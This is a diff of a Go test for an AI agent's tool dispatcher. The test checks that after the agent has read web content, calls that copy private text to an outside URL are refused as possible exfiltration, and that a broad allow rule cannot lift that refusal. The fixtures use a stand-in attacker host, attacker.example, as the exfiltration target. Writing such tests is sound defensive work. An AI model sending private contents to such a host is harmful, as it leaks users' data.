@@ -235,14 +235,22 @@ func TestUnattendedFetchCopyingIsolatedTextNeedsARule(t *testing.T) {
 	requireRuns(t, dc, calls, fetch(link))                             // A link the model followed.
 	requireRuns(t, dc, calls, fetch("https://attacker.example/c?d=1")) // No copied text.
 
-	// Interactive runs keep their ordinary path.
+	// Once a web read occurred, private URL copies are refused in every run type.
 	dc.MessageSource = ""
-	requireRuns(t, dc, calls, exfil)
+	requirePrivateURLRefused := func() {
+		t.Helper()
+		call, before := exfil, *calls
+		result := DispatchToolCallResult(context.Background(), &call, dc, "fixture")
+		if result.Status != ToolResultDenied || !strings.Contains(result.Output, "possible_exfiltration") || *calls != before {
+			t.Fatalf("private URL copy: %+v calls=%d", result, *calls)
+		}
+	}
+	requirePrivateURLRefused()
 
-	// A rule that names the tool and target lifts it, as it does for any unattended action.
+	// A generic allow rule cannot authorize disclosure of private contents.
 	dc.MessageSource = "background"
 	dc.Cfg.Agent.ActionPolicy.Allow = []config.ActionPolicyRule{{Tool: "api_request", Operation: "*", Target: "url:https://attacker.example/c"}}
-	requireRuns(t, dc, calls, exfil)
+	requirePrivateURLRefused()
 	dc.Cfg.Agent.ActionPolicy.Allow = nil
 
 	// The check does not depend on the run having read the text: another session is clean.
